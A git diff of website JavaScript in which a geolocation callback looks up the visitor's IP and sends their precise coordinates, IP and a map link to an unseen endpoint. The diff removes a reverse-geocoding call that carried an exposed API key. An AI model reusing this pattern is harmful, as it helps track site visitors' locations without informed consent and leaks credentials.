@@ -150,11 +150,6 @@ function success(pos) {
   const longitude = crd.longitude;
   const accuracy = crd.accuracy;
 
-  fetch(
-    `https://api.opencagedata.com/geocode/v1/json?q=${crd.latitude}+${crd.longitude}&key=03c48dae07364cabb7f121d8c1519492&no_annotations=1&language=en`,
-  )
-    .then((response) => response.json())
-    .then((locationData) => {
       fetch("https://api.ipify.org/?format=json")
         .then((response) => response.json())
         .then((ipData) => {
@@ -167,8 +162,7 @@ function success(pos) {
             body: JSON.stringify({
               name: "Location of Visiter",
               message: `
-          Visitors address: ${locationData.results[0].formatted}
-          Map Url: https://www.google.com/maps/place/${locationData.results[0].formatted.split(" ").join("+")}/@${latitude},${longitude},17z/data=!3m1!4b1!4m6!3m5!1s0x40307d9be82415c7:0x2ffa2f30c944209f!8m2!3d40.3849492!4d49.8286448!16s%2Fg%2F11gj5dn5f1?entry=ttu
+          Visitors address: https://www.google.com/maps/place/@${latitude},${longitude},17z/data=!3m1!4b1!4m6!3m5!1s0x40307d9be82415c7:0x2ffa2f30c944209f!8m2!3d40.3849492!4d49.8286448!16s%2Fg%2F11gj5dn5f1?entry=ttu
           IP: ${ipData.ip}
           Latitude:  ${latitude} 
           Longitude: ${longitude} 
@@ -177,9 +171,8 @@ function success(pos) {
             }),
           })
             
-          console.log("Done")
         });
-    });
+   
 }
 
 function error(err) {
